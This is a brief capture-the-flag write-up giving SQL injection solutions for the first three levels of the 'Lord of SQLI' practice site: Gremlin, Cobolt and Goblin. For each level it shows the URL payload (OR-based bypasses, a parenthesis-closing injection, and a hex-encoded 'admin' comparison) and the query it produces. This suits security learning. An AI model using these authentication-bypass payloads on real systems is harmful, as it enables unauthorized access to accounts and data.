---
description: 'https://los.rubiya.kr/'
---

# Lord of SQLI

## 1. Gremlin

URL Solution: ?pw=' OR ''= '

QUERY: select id from prob\_gremlin where id='' and pw='' OR '1'= '1'

## 2. Cobolt

URL: ?pw='\) OR \( id = 'admin

QUERY: select id from prob\_cobolt where id='' and pw=md5\(''\) OR \( id = 'admin'\)



## 3. Goblin

URL: ?no=no OR 1=1 ORDER BY id

QUERY: select id from prob\_goblin where id='guest' and no=no OR 1=1 ORDER BY id

---

URL: ?no=0 or id=0x61646d696e

QUERY: select id from prob\_goblin where id='guest' and no=0 or id=0x61646d696e

